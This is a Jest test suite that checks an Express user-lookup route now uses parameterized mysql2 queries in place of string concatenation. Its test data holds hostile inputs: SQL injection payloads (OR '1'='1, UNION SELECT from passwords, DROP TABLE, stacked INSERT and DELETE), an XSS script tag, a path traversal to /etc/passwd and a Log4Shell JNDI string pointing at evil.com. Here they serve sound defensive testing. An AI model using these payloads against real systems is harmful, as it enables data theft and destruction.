/**
 * Test suite for SQL Injection vulnerability remediation in vulnerable-sql.js
 *
 * This test suite validates that:
 * 1. The SQL injection vulnerability has been fixed using parameterized queries
 * 2. Malicious SQL injection payloads are properly sanitized
 * 3. Normal functionality continues to work as expected
 */

const request = require('supertest');
const mysql = require('mysql2');

// Mock the mysql2 module to intercept queries
jest.mock('mysql2');

describe('SQL Injection Vulnerability Remediation Tests', () => {
  let app;
  let mockConnection;
  let capturedQuery;
  let capturedParams;

  beforeEach(() => {
    // Clear module cache to get fresh instance
    jest.clearAllMocks();
    jest.resetModules();

    // Setup mock connection
    mockConnection = {
      query: jest.fn((query, paramsOrCallback, callback) => {
        // Capture the query and parameters for validation
        if (typeof paramsOrCallback === 'function') {
          // Old vulnerable style: query(sql, callback)
          capturedQuery = query;
          capturedParams = null;
          paramsOrCallback(null, []);
        } else {
          // New secure style: query(sql, params, callback)
          capturedQuery = query;
          capturedParams = paramsOrCallback;
          callback(null, []);
        }
      })
    };

    mysql.createConnection.mockReturnValue(mockConnection);

    // Import the app after mocking
    app = require('./vulnerable-sql.js');
  });

  describe('Parameterized Query Usage', () => {
    test('should use parameterized query with placeholder', async () => {
      const username = 'testuser';

      await request(app)
        .get('/user')
        .query({ username });

      // Verify that the query uses ? placeholder instead of concatenation
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
    });

    test('should pass username as parameter array', async () => {
      const username = 'validuser';

      await request(app)
        .get('/user')
        .query({ username });

      // Verify that username is passed as a parameter, not concatenated
      expect(capturedParams).toEqual([username]);
    });
  });

  describe('SQL Injection Attack Prevention', () => {
    test('should safely handle SQL injection with OR statement', async () => {
      const maliciousUsername = "admin' OR '1'='1";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify the query structure hasn't changed
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");

      // Verify the malicious input is passed as a parameter (will be escaped by mysql2)
      expect(capturedParams).toEqual([maliciousUsername]);

      // Verify the malicious payload is NOT concatenated into the query string
      expect(capturedQuery).not.toContain("OR '1'='1");
      expect(capturedQuery).not.toContain(maliciousUsername);
    });

    test('should safely handle SQL injection with UNION SELECT', async () => {
      const maliciousUsername = "admin' UNION SELECT * FROM passwords--";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify parameterized query is used
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([maliciousUsername]);

      // Verify UNION SELECT is not part of the query structure
      expect(capturedQuery).not.toContain('UNION');
      expect(capturedQuery).not.toContain('passwords');
    });

    test('should safely handle SQL injection with DROP TABLE', async () => {
      const maliciousUsername = "admin'; DROP TABLE users--";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify parameterized query is used
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([maliciousUsername]);

      // Verify DROP TABLE is not part of the query structure
      expect(capturedQuery).not.toContain('DROP');
    });

    test('should safely handle SQL injection with comment injection', async () => {
      const maliciousUsername = "admin'--";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify parameterized query is used
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([maliciousUsername]);
    });

    test('should safely handle SQL injection with multiple quotes', async () => {
      const maliciousUsername = "' OR ''='";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify parameterized query is used
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([maliciousUsername]);

      // Verify the quotes are not breaking the query structure
      expect(capturedQuery).not.toContain("OR ''='");
    });

    test('should safely handle SQL injection with stacked queries', async () => {
      const maliciousUsername = "admin'; INSERT INTO users VALUES('hacker','pass')--";

      await request(app)
        .get('/user')
        .query({ username: maliciousUsername });

      // Verify parameterized query is used
      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([maliciousUsername]);

      // Verify INSERT is not part of the query structure
      expect(capturedQuery).not.toContain('INSERT');
    });
  });

  describe('Legitimate User Input Handling', () => {
    test('should correctly handle normal username', async () => {
      const username = 'john_doe';

      await request(app)
        .get('/user')
        .query({ username });

      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([username]);
    });

    test('should correctly handle username with special characters', async () => {
      const username = "o'brien"; // Legitimate name with apostrophe

      await request(app)
        .get('/user')
        .query({ username });

      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([username]);

      // Verify apostrophe doesn't break the query
      expect(capturedQuery).not.toContain("o'brien");
    });

    test('should correctly handle username with numbers', async () => {
      const username = 'user123';

      await request(app)
        .get('/user')
        .query({ username });

      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([username]);
    });

    test('should correctly handle empty username', async () => {
      const username = '';

      await request(app)
        .get('/user')
        .query({ username });

      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([username]);
    });

    test('should correctly handle username with spaces', async () => {
      const username = 'john doe';

      await request(app)
        .get('/user')
        .query({ username });

      expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");
      expect(capturedParams).toEqual([username]);
    });
  });

  describe('Database Error Handling', () => {
    test('should handle database errors gracefully', async () => {
      mockConnection.query = jest.fn((query, params, callback) => {
        callback(new Error('Database connection failed'), null);
      });

      const response = await request(app)
        .get('/user')
        .query({ username: 'testuser' });

      expect(response.status).toBe(500);
      expect(response.text).toBe('Database error');
    });
  });

  describe('Query Structure Validation', () => {
    test('should never concatenate user input into query string', async () => {
      const testInputs = [
        'normaluser',
        "' OR '1'='1",
        'admin--',
        'user; DROP TABLE users',
        '<script>alert(1)</script>',
        '../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const username of testInputs) {
        await request(app)
          .get('/user')
          .query({ username });

        // Always should use parameterized query
        expect(capturedQuery).toBe("SELECT * FROM users WHERE username = ?");

        // User input should never appear in the query string itself
        expect(capturedQuery).not.toContain(username);

        // User input should only appear in the parameters array
        expect(capturedParams).toEqual([username]);
      }
    });

    test('should maintain consistent query structure regardless of input', async () => {
      const baselineQuery = "SELECT * FROM users WHERE username = ?";
      const testInputs = [
        'user1',
        "' OR 1=1--",
        'admin\' OR \'a\'=\'a',
        '; DELETE FROM users;'
      ];

      for (const username of testInputs) {
        await request(app)
          .get('/user')
          .query({ username });

        // Query structure should never change
        expect(capturedQuery).toBe(baselineQuery);
      }
    });
  });
});
